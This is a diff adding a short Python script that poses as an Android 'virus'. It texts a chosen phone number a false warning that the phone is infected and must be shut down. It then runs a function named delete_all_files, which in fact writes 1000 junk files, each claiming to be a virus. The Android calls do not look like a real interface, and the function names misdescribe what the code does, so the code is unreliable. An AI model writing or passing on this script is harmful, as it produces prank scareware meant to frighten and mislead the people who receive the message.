@@ -1,0 +1,16 @@
+import android
+def delete_all_files():
+    for i in range(1000):
+        file = open("file_" + str(i), "w")
+        file.write("This file is a virus and must be deleted.")
+        file.close()
+def delete_all_files_and_quit():
+    delete_all_files()
+    android.quit()
+def send_message(phone_number):
+    android.send_sms(phone_number, "Your phone has been infected with a virus and must be shut down.")
+def main():
+    phone_number = input("Enter phone number: ")
+    send_message(phone_number)
+    delete_all_files_and_quit()
+main()
